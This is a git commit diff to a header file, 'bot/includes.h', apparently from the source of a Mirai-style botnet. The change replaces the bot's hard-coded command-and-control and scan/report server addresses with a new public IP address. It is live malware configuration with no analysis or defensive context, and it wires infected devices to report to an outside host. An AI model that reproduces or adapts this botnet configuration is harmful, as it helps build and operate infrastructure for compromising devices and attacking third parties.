aa0b6e41154ef114ff2569bf0f8de7956b251774
squishy <89873236+squishy9876@users.noreply.github.com>
2024-04-16 22:22:09 -0400

    Update includes.h

--- bot/includes.h
+++ bot/includes.h
@@ -17,11 +17,11 @@ typedef uint16_t port_t;
 
 #define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
 
-#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
+#define FAKE_CNC_ADDR   INET_ADDR(176,97,114,180)
 #define FAKE_CNC_PORT   80
 
-#define SCANIP (int)inet_addr((const char*)"134.122.30.138");
-#define SERVIP (int)inet_addr((const char*)"134.122.30.138");
+#define SCANIP (int)inet_addr((const char*)"176.97.114.180");
+#define SERVIP (int)inet_addr((const char*)"176.97.114.180");
 
 ipv4_t LOCAL_ADDR;
 
